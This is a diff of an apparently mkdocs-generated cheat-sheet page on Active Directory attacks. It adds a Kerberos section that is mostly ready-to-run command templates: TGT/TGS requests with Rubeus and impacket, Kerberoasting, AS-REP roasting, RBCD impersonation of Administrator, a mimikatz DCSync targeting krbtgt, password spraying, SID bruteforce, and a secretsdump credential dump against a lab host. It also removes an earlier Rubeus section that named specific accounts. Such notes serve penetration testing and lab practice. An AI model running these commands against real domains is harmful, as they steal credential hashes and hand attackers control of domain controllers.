@@ -15,7 +15,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.5">
     
     
       
@@ -312,17 +312,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#rubeus" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Rubeus
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#snaffler" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -330,6 +319,133 @@
       
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kerberos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ask-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ask TGT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ask-tgs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ask TGS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#convert-tickets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Convert tickets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#as-rep-roasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REP Roasting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rbcd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RBCD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#password-spread" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password spread
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sid-bruteforce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SID bruteforce
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credentials-dump" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credentials dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -557,19 +673,55 @@
 </tbody>
 </table>
 <h2 id="disable-powershell-script-execution">Disable powershell script execution</h2>
+<p>To run PowerShell scripts on a Windows machine, you may need to adjust the execution policy to allow script execution. This is often required for running tools like PowerView or custom scripts during enumeration.</p>
 <pre><code>Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 # or
 Set-ExecutionPolicy bypass -Scope process
 </code></pre>
 <h2 id="bloodhound">BloodHound</h2>
+<p>BloodHound is a powerful tool for visualizing Active Directory relationships and identifying attack paths. It collects data using SharpHound and stores it in a Neo4j database for analysis.</p>
 <pre><code>.\SharpHound.exe -c All --zipfilename &lt;filename&gt;
-</code></pre>
-<h2 id="rubeus">Rubeus</h2>
-<pre><code>.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
-.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 </code></pre>
 <h2 id="snaffler">Snaffler</h2>
 <pre><code>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
+</code></pre>
+<h2 id="kerberos">Kerberos</h2>
+<p>Kerberos is the authentication protocol used in Active Directory. The following sections cover various Kerberos-related attacks and operations.</p>
+<h3 id="ask-tgt">Ask TGT</h3>
+<pre><code>./Rubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /domain:&lt;domain&gt; /dc:&lt;ip-dc&gt; /ptt /nowrap
+./Rubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /domain:&lt;domain&gt; /dc:&lt;ip-dc&gt; /outfile:&lt;outfile&gt; /nowrap
+impacket-getTGT &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;ip-dc&gt; -debug
+</code></pre>
+<h3 id="ask-tgs">Ask TGS</h3>
+<pre><code>./Rubeus.exe asktgs /domain:&lt;domain&gt; /dc:&lt;ip-dc&gt; /service:&lt;service&gt; /nowrap
+KRB5CCNAME=./&lt;username&gt;.ccache impacket-getST &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -no-pass -k -spn &lt;service&gt; -dc-ip &lt;ip-dc&gt; -debug
+</code></pre>
+<h3 id="convert-tickets">Convert tickets</h3>
+<pre><code>impacket-ticketConverter &lt;filename.ccache&gt; &lt;outfile.kirbi&gt;
+</code></pre>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<pre><code>./Rubeus.exe kerberoast /ticket:&lt;tgt-ticket&gt; /user:&lt;username&gt; /domain:&lt;domain&gt; /dc:&lt;ip-dc&gt; /nowrap
+</code></pre>
+<h3 id="as-rep-roasting">AS-REP Roasting</h3>
+<pre><code>./Rubeus.exe asreproast /user:&lt;username&gt; /domain:&lt;domain&gt; /dc:&lt;ip-dc&gt; /nowrap
+</code></pre>
+<h3 id="rbcd">RBCD</h3>
+<pre><code>impacket-rbcd -action write &lt;domain&gt;/&lt;vulnerable_user&gt;:&lt;password&gt; -dc-ip &lt;ip-dc&gt; -delegate-to 'DC01$' -delegate-from &lt;controled_computer&gt;
+impacket-getST &lt;domain&gt;/&lt;controled_computer&gt;\$:&lt;password&gt; -impersonate Administrator -spn CIFS/DC01.&lt;domain&gt; -dc-ip &lt;ip-dc&gt;
+export KRB5CCNAME=$(readlink -f Administrator.ccache)
+crackmapexec smb DC01.&lt;domain&gt; -k --use-kcache --sam
+</code></pre>
+<h3 id="dcsync">DCSync</h3>
+<pre><code>.\mimikatz.exe lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt
+</code></pre>
+<h3 id="password-spread">Password spread</h3>
+<pre><code>nxc ldap &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --users
+</code></pre>
+<h3 id="sid-bruteforce">SID bruteforce</h3>
+<pre><code>impacket-lookupsid &lt;username&gt;:&lt;password&gt;@&lt;ip-dc&gt;
+</code></pre>
+<h3 id="credentials-dump">Credentials dump</h3>
+<pre><code>impacket-secretsdump vagrant:vagrant@192.168.56.11
 </code></pre>
 
 
